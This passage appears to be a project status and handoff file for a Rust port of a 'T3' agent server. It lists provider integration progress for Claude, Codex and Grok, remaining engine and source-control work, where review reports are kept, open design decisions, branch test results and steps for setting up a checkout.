   lints) are in `CRATES.md`, "Lint set".
2. **Provider interface.** The server side of the host handle
   (`ProviderHost`: only the trait and a rooted file host exist; no terminals, and the
   server passes none); titles through an agent provider (see
   "Claude provider: background work, …"); Claude's workflow tasks and `stopTask`; Claude's
   `customModels` and `autoCompactWindow` (see "Provider instance settings for Claude and
   Codex"). The Codex status probe and Codex's `customModels` are built (2026-11-15).
3. **Other providers.** One ACP provider for Grok, Kiro, fx, Antigravity and the ACP registry:
   `crates/conn-provider-acp`. **Grok is offered by the server (2026-11-14):** T3's default
   `grok` instance, off until `providerInstances.grok` enables it, probed as T3 probes the CLI
   (`--version`, `models`, `inspect --json`, an ACP `initialize`) at start, on a settings change,
   every 5 minutes and on `server.refreshProviders`, with `providerStatuses` on config streams.
   The trial ruled out the official schema crate: it cannot express T3's negotiating
   `initialize` and costs 565 KiB on the release binary; the crate uses its own JSON-RPC with
   T3's key order. Proven: all 15 Grok transcripts (and 2 compaction scenarios) replay with
   every frame and event equal to T3's; a stub agent sees the same argv, environment, stdin
   bytes and shutdown from T3's Grok adapter and ours in all 17 scenarios; T3's status probe and ours give the same
   entry and the same CLI runs in 14 of 14 stub scenarios (missing, hanging, failing, old,
   logged out, ready, …); the real client decodes the probed entry. Not ported on purpose:
   T3's Grok account and usage read (credentials and xAI's API) and the version advisory (a
   registry lookup). `/compact` is served since part 3, background work and subagents since
   part 4 (all 17 Grok replays equal). Next, in order: ACP protocol 2 replies for Kiro, then
   fx, Antigravity, the file and terminal host (`ProviderHost`; in T3 only Antigravity's files
   and the registry's terminals use it), and of the registry only its two offline methods and
   local agents (it installs nothing, by Nick's decision of 2026-11-14). Cursor, OpenCode and Muse go in the SDK host as driver modules.
4. **Replay of the T3 server's `testkit` fixtures: done (2026-11-14), Claude, Codex and Grok.**
   See "Engine, part 2", "Codex: the turn start, …", "ACP provider, part 3", "Codex:
   subagents, …" and "Engine, part 3". Codex passes all 25; buffered delivery is done. Next:
   the replay gate in the ACP stub with `finish_held_run` (4 Grok variants, which also need
   Grok background tasks), Grok subagents, Claude's background wakes.
5. **Engine.** Merge-back and the portable fork path (both need T3's `ContextHandoffService`);
   prepared runs and setup scripts in a `setup-<id>` terminal; bounded thread snapshots and the `/history`, `/bounded` and
   `/transcript` routes (a full snapshot of a long thread peaks at about 13 bytes per byte of
   JSON); a workspace strategy for delegated tasks; search details (no NFC normalization, the
   old snippet rule); titles through a text generator or Codex (Claude as the title model keeps
   the seed title until the Claude provider implements `generate_text`; no fork source or
   linked pull request context in the prompt; no fallback to another provider). `freshContext` is
   served. A Claude turn shows as running at once since 2026-11-14.
6. **Features.** Pull requests and source control: `crates/conn-source-control/README.md` maps
   the area (48 methods, 7 engine commands, 9 `/mcp` tools, 7 hosts). Served (2026-11-14):
   `server.discoverSourceControl` for all 7 hosts, and all 9 `sourceControl.*` (sign-in as a
   T3 server without an app client id; GitHub stars; `lookupRepository`, `cloneRepository`,
   `publishRepository` on all 7 hosts). Built since (part 4): the definition registry,
   provider detection, GitHub's GraphQL operations generated, the engine's link and unlink as
   T3's, 5 of the 9 `/mcp` tools. Next: the project's `repositoryIdentity`, GitHub's request
   policy, each host's change request reads and checkout, then `git.*`, `pr` in VCS status,
   `pullRequests.*` (35), the other 5 linked pull request commands and 4 `/mcp` tools.
   Also: the Conn-only methods
   (annotations, panels, scheduled tasks, peer links, test logins, credentials, secrets, guest
   share); 67 more `/mcp` tools (11 need nothing new: `crates/conn-mcp/README.md`, "All 87 tools"); Codex subagent stop (the wakes are built, 2026-11-15); worktree setup scripts
   the T3 way (typed into a thread terminal, with a completion marker).
7. **Small leftovers.** Done on 2026-11-14 (`docs/server-area.md`, end): the contract's
   limits on terminal environment variables and `assets.createUrl` strings (generated,
   `limits-diff` check); `git` children are reaped (a test). Left:
   T3's search ranking (`scoreThreadSearch`, `rankMessageMatches`) for `t3_thread_search` and
   `orchestration.searchThreads`; `@` file search ranks with nucleo, not T3's fff (`@hello`
   finds `hello.ts`, T3 also `helper.ts`); the Linux systemd scope for provider processes;
   a cap on the blocking pool or one store thread (measure first: each store call takes its
   own blocking thread).
8. **Proofs.** Live Codex; the Linux pass; Orbit in a scratch container on Beast; desktop and
   mobile in a VM; the recorder scenarios on Linux. The recorder with the real web client and
   a live model is done (2026-11-14, see "What exists").
9. **Upkeep.** Wire the bump into the nightly sync (its script is outside the Conn
   repository; `FORK.md` there says the Grok bot runs it). The first real bump
   (2026-11-14, `docs/upkeep.md` "Bumps") took about four hours. The provider gaps it left:
   reaping a recorded Claude CLI after a restart and `workState: "waiting_for_children"` in
   `/mcp` (Claude Monitor wakes are built since 2026-11-14).

### Where the review reports are

The reports are not in this repository. They are the last messages of archived T3 threads on
Nick's Mac (environment `f4f0396f-abce-4d69-ab4d-fb7a3deb4a59`). Read one with
`t3_thread_read` and the thread id
`thread:delegated-task:command%3Amcp%3A5683d32c-4438-47d4-b4f5-f332534338a4%3Adelegate-task%3A<id>`.
The check is the one to trust; several review findings did not hold.

| Component | Review `<id>` | Check `<id>` |
| --- | --- | --- |
| Wire, contract, server core | `308d769a-2079-4298-acf5-0bbc6c2b7180` | `08e72c69-bfa8-4a7e-87a8-7bd1395d9d28` |
| Engine | `62f9d7e3-2dc0-4b8c-a042-542001cbbf95` | `92e476d6-b3a6-408d-9c24-839223b3b7fc` |
| Providers and provider design | `a8b8cd82-8224-43a8-b2ca-939e94a95969` | `bbc1e75d-fa7d-4682-8ad7-9b98409e498e` |
| `/mcp`, VCS, files, terminals | `5f4ab600-8c53-4c67-a39a-66b70c973657` | `c6ed9769-964e-4c09-a5b4-8f4135bae4b7` |
| Staying in step with upstream | `0cc1607f-a17a-4e15-8f8e-9067e0a9bd99` | `418f55a2-c39b-4001-aa8e-859d8418e74c` |
| Rust practices and lints | `d81e0bb1-497f-423b-b126-4355d1499056` | `b7febae4-55da-48bc-a558-ea25ca6925a6` |

## Decisions that were open

- `/mcp` accepts any session with `orchestration:read`, because Orbit's Swamp planned to call
  it that way. The T3 server accepts only an MCP OAuth client there. It is the one deliberate
  difference in access rules.
- Which Claude settings a container loads, and how long an idle `claude` process stays open.
- What must be true before this server becomes a default, and whether a container that
  switches keeps its T3 sessions and threads.
- BeautifulRust is the Rust standard. A checker advised to leave the cast lints off and to
  allow one `bool` parameter. Neither was adopted.
- `vcs.removeWorktree` and `vcs.init` accept any path, as the T3 server does. No limit added.
- We keep our own `/mcp` transport: `rmcp` measured 0.94 MB more binary and about 0.12 MB per
  open session.

## Branches


- `t3/32cd278b` (text generators, titles, `runNow`, the redacting `Debug`): all 31 checks pass
  on macOS (2026-11-14). No new dependency; the release binary grew by 93,648 bytes
  (16,558,944 to 16,652,592, macOS arm64).
- `t3/ea388396` (Orbit's task-turn path, 2026-11-14, `main` `c5242fa` merged in): 38 checks
  with `CONN_MONOREPO`. One run passed all 38; a second failed only `cargo test` on
  `conn-terminal`'s `clears_and_reports_the_foreground_command` (no idle upsert after
  Ctrl-C, while another agent's checks loaded the machine), which then passed alone twice
  and in the crate's full run. macOS only.
- `main`: verified. All 39 checks pass on macOS (2026-11-14, with the ACP provider, scheduled
  tasks and annotations). The last Linux pass (all tests, 20 runs on the gnu target and 5 on
  musl, 2026-11-14) is older than those merges.
- Fixed on 2026-11-14: the T3 adapter closes the Claude query after an interrupt, and the next
  turn resumes in a new CLI process. Our provider kept the process, and the check's reference
  depended on timing. Both are corrected (`claude conformance`: `interrupt` with 2 CLI starts,
  `interrupt_twice` with 3). Open: the T3 server also closes an idle Claude query on a Stop
  with no running turn; and it runs one effect per thread at a time, which our engine does
  not do for Codex and ACP.
- `t3/4a342c63` (2026-11-14, not merged): all 30 checks pass on macOS (`check exit: 0`, none
  skipped). Claude provider, see "Claude provider: what the
  fixture replay showed".
- In the Conn repository there are local branches only (`rust/*`, `spike/rust-*`,
  `split/conn-server*`), with the same history under `native/conn-server`. They were never
  pushed. They change nothing under `apps/` or `packages/`.

## To set up a checkout

1. Read `AGENTS.md` and `README.md`.
2. `eval "$(tools/conn-checkout --source <conn git dir or URL>)"` gives a Conn checkout at
   `conn.pin` as `CONN_MONOREPO`.
3. `(cd helpers/sdk-host && npm ci)`, then `tools/check.sh`. It must pass before any change.
4. Move the pin with `tools/bump-conn.sh <commit> --capture` and read "What to do" at the
   top of its report (`docs/upkeep.md`).

CI: on 2026-11-14 the rust job passed on Linux for the first time, with every step green:
format, clippy, the tests of all crates (with the SDK host installed, Node 26.12.1), and the
recordings decode step. That is one run; on 2026-11-13 the test step passed in one run and
failed in the next on the terminal byte-window test, which is fixed since. `cargo-deny` and
the musl release build pass. The job with the Conn checkout fails: it needs the repository
secret `CONN_READ_TOKEN` (read access to `nckrtl/conn`). The nightly schedule is switched off
until that job can run.
